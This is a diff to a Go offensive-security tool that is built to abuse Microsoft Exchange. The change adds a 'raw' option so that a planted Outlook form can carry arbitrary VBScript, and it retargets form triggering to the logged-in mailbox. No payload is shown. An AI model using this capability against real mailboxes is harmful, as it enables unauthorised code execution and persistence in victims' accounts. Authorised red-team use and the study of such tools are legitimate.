@@ -580,8 +580,14 @@ func createForm(c *cli.Context) error {
 	if err := forms.CreateFormAttachmentPointer(folderid, msgid); err != nil {
 		return err
 	}
-	if err := forms.CreateFormAttachmentTemplate(folderid, msgid, command); err != nil {
-		return err
+	if c.Bool("raw") == true {
+		if err := forms.CreateFormAttachmentForDeleteTemplate(folderid, msgid, command); err != nil {
+			return err
+		}
+	} else {
+		if err := forms.CreateFormAttachmentTemplate(folderid, msgid, command); err != nil {
+			return err
+		}
 	}
 	utils.Info.Println("Form created successfully")
 
@@ -614,7 +620,7 @@ func triggerForm(c *cli.Context) error {
 	body := c.String("body")
 	suffix := c.String("suffix")
 	folderid := mapi.AuthSession.Folderids[mapi.INBOX]
-	target := c.GlobalString("email")
+	target := mapi.AuthSession.Email
 
 	utils.Trace.Println("Creating Trigger message.")
 	msgid, err := forms.CreateFormTriggerMessage(suffix, subject, body)
@@ -759,7 +765,7 @@ A tool by @_staaldraad from @sensepost to abuse Exchange Services.`
 		} else if c.Bool("debug") == true {
 			utils.Init(os.Stdout, os.Stdout, os.Stdout, os.Stderr)
 		} else {
-			utils.Init(ioutil.Discard, os.Stdout, os.Stdout, os.Stderr)
+			utils.Init(ioutil.Discard, os.Stdout, ioutil.Discard, os.Stderr)
 		}
 		return nil
 	}
@@ -1030,6 +1036,10 @@ A tool by @_staaldraad from @sensepost to abuse Exchange Services.`
 						cli.BoolFlag{
 							Name:  "send,s",
 							Usage: "Trigger the form once it's been created.",
+						},
+						cli.BoolFlag{
+							Name:  "raw",
+							Usage: "Use a blank template allowing Raw VBScript.",
 						},
 						cli.BoolFlag{
 							Name:  "rule,r",
